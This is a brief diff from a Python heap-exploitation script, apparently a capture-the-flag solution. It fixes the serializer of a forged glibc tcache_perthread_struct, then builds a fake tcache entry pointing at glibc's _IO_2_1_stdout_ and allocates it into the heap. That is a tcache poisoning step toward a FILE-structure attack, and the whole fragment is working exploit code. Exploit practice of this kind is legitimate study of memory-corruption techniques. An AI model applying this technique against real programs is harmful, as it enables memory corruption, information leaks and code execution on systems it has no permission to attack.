@@ -178,7 +178,7 @@ class TcachePerthreadStruct:
             res += p16(count)
         for pointer in self.pointers:
             res += p64(pointer)
-        return output
+        return res
 fake_tcache = TcachePerthreadStruct()
 fake_tcache.set(0x100, glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_'])
 create(0, 0x288, bytes(fake_tcache)) # heap_base_addr+0x10
